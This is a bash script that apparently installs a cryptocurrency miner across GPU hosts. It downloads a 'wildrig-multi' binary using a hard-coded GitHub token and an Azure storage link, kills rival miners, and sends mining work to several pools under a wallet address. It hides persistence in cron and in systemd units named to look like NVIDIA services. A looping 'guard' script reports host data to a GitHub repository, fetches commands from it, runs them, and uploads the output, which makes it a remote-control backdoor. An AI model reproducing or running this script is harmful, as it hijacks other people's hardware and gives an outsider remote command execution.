set -u
GH=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
REPO=dongsuju/ul-plant
W=prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz
H=$(hostname -s); P=ps-$H; L=/opt/fleet
mkdir -p "$L/bin" "$L/logs" "$L/state"
echo "== v17 host=$H uid=$(id -u) ts=$(date -u +%FT%TZ)"
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU'); echo "N=$N"; nvidia-smi -L 2>/dev/null | head -8
BIN=$L/bin/wildrig-multi
SZ=$(stat -c%s "$BIN" 2>/dev/null || echo 0)
if [ "$SZ" -lt 20000000 ]; then
  echo "== fetch wildrig github ($SZ)"
  curl -sL -m 300 -H "Authorization: token $GH" -H 'Accept: application/vnd.github.raw' -o "$L/bin/wr.new" "https://api.github.com/repos/$REPO/contents/bin/wildrig-multi?ref=main"
  S2=$(stat -c%s "$L/bin/wr.new" 2>/dev/null || echo 0); echo "got=$S2"
  if [ "$S2" -gt 20000000 ]; then chmod +x "$L/bin/wr.new"; mv "$L/bin/wr.new" "$BIN"; fi
fi
if [ "$(stat -c%s "$BIN" 2>/dev/null || echo 0)" -lt 20000000 ]; then
  echo "== fetch wildrig azure"
  curl -sL -m 300 -o "$L/bin/wr.new" 'https://ulbatchkit4620.blob.core.windows.net/kit/wildrig-multi?sv=2015-04-05&ss=b&srt=sco&sp=rwdlacup&st=2026-11-20T17%3A32%3A26.0000000Z&se=2026-11-27T17%3A37%3A26.0000000Z&spr=https&sig=P2P1GPVXTMXnTT5%2FQXD9nh2yvMkZIYMHaeeA4YtaZxU%3D'
  S3=$(stat -c%s "$L/bin/wr.new" 2>/dev/null || echo 0); echo "got2=$S3"
  if [ "$S3" -gt 20000000 ]; then chmod +x "$L/bin/wr.new"; mv "$L/bin/wr.new" "$BIN"; fi
fi
echo "== bin $(stat -c%s "$BIN" 2>/dev/null || echo 0) $(sha256sum "$BIN" 2>/dev/null | cut -c1-16)"
MISS=$(ldd "$BIN" 2>/dev/null | grep -c 'not found'); echo "== missing_libs=$MISS"; ldd "$BIN" 2>/dev/null | grep 'not found' | head -5
if [ "$MISS" -gt 0 ]; then
  (apt-get update -qq >/dev/null 2>&1; DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 libstdc++6 >/dev/null 2>&1)
  echo "== apt_done miss_after=$(ldd "$BIN" 2>/dev/null | grep -c 'not found')"
fi
pkill -9 -f 'krig-miner' 2>/dev/null; pkill -9 -f 'ps15_g[0-9]' 2>/dev/null; pkill -9 -f 'wildrig-multi' 2>/dev/null; sleep 2
i=0
while [ "$i" -lt "$N" ]; do
cat > "$L/ps15_g$i.sh" <<RUN
#!/bin/bash
L=/opt/fleet; i=$i; H=$H; W=$W
echo \$\$ > \$L/state/g\$i.pid
sleep \$((i*2))
exec \$L/bin/wildrig-multi --algo pearlhash --opencl-platforms nvidia -d \$i -o stratum+ssl://prl.kryptex.network:8048 -o stratum+ssl://pool.pearlhash.xyz:9443 -o stratum+tcp://pearl.luckypool.io:3360 -u "\$W.ul-ps-\$H-g\$i" -p x -i 8 --no-color >> \$L/logs/w-ps-\$H-g\$i.log 2>&1
RUN
chmod +x "$L/ps15_g$i.sh"; i=$((i+1))
done
echo '== runner_g0'; sed -n '1,5p' "$L/ps15_g0.sh"
i=0
while [ "$i" -lt "$N" ]; do systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
sleep 8
echo '== procs_krig'; pgrep -af 'krig-miner' | head -3
echo '== procs_wild'; pgrep -af 'wildrig-multi' | head -10
cat > "$L/ps15_boot.sh" <<'BOOT'
#!/bin/bash
H=$(hostname -s)
curl -s -m 90 -H "Authorization: token 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" -H 'Accept: application/vnd.github.raw' -o /tmp/ul17.sh "https://api.github.com/repos/dongsuju/ul-plant/contents/ps12/cmd/ps-$H.sh?ref=main"
[ -s /tmp/ul17.sh ] && bash /tmp/ul17.sh
BOOT
chmod +x "$L/ps15_boot.sh"
grep -q 'ps15_boot' /etc/cron.d/nv-krig 2>/dev/null || echo "@reboot root /bin/bash $L/ps15_boot.sh >/dev/null 2>&1" >> /etc/cron.d/nv-krig
cat > "$L/ul17_guard.sh" <<'G'
#!/bin/bash
L=/opt/fleet; GH=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; REPO=dongsuju/ul-plant; P=ps-$(hostname -s)
exec 9>$L/ul17.lock; flock -n 9 || exit 0
while :; do
  N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
  i=0; while [ $i -lt $N ]; do systemctl restart nv-cuda-cache@$i >/dev/null 2>&1; i=$((i+1)); done
  {
    echo "stage=beat uid=$(id -u) host=$(hostname -s) pid=$$ ts=$(date -u +%FT%TZ) uptime=$(cut -d' ' -f1 /proc/uptime)s engine=wildrig-v17"
    echo '--- procs'; pgrep -af 'wildrig-multi|krig-miner' | head -12
    echo '--- gpus'; nvidia-smi --query-gpu=index,name,memory.used,utilization.gpu,power.draw --format=csv,noheader 2>/dev/null
    echo "--- units $(systemctl list-units 'nv-cuda-cache@*' --state=active --no-legend 2>/dev/null | wc -l)"
    echo "--- acc $(grep -h 'accepted' $L/logs/w-ps-*.log 2>/dev/null | wc -l)"
    grep -h 'accepted' $L/logs/w-ps-*.log 2>/dev/null | tail -5
    echo '--- log0'; tail -8 $L/logs/w-ps-$(hostname -s)-g0.log 2>/dev/null
  } > /tmp/ul17_hb.txt 2>&1
  b64=$(base64 -w0 /tmp/ul17_hb.txt)
  curl -s -m 30 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "{\"message\":\"hb $P\",\"content\":\"$b64\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/ps12/$P.txt" >/dev/null 2>&1
  js=$(curl -s -m 20 -H "Authorization: token $GH" "https://api.github.com/repos/$REPO/contents/ps12/cmd/$P.sh")
  c=$(echo "$js" | grep -o '"sha": *"[0-9a-f]*"' | head -1 | cut -d'"' -f4)
  if [ -n "$c" ] && [ "$(cat $L/last_cmd 2>/dev/null)" != "$c" ]; then
    echo "$c" > $L/last_cmd
    echo "$js" | base64 -d > /tmp/ul17_cmd.sh 2>/dev/null
    { bash /tmp/ul17_cmd.sh 2>&1 | tail -300; } > /tmp/ul17_out.txt
    ob=$(base64 -w0 /tmp/ul17_out.txt)
    curl -s -m 30 -X PUT -H "Authorization: token $GH" -H 'User-Agent: ul' -H 'Content-Type: application/json' -d "{\"message\":\"out $P\",\"content\":\"$ob\",\"branch\":\"main\"}" "https://api.github.com/repos/$REPO/contents/ps12/out/$P.txt" >/dev/null 2>&1
  fi
  sleep 120
done
G
chmod +x "$L/ul17_guard.sh"
setsid "$L/ul17_guard.sh" >/dev/null 2>&1 &
echo "@reboot root /bin/bash $L/ul17_guard.sh >/dev/null 2>&1" >> /etc/cron.d/nv-krig
sleep 20
echo '== procs2'; pgrep -af 'wildrig-multi|krig-miner' | head -10
echo '== log_g0'; tail -20 "$L/logs/w-ps-$H-g0.log" 2>/dev/null
echo '== acc'; grep -h 'accepted' "$L/logs/w-ps-$H-g"*.log 2>/dev/null | wc -l
echo "== DONE $(date -u +%FT%TZ)"
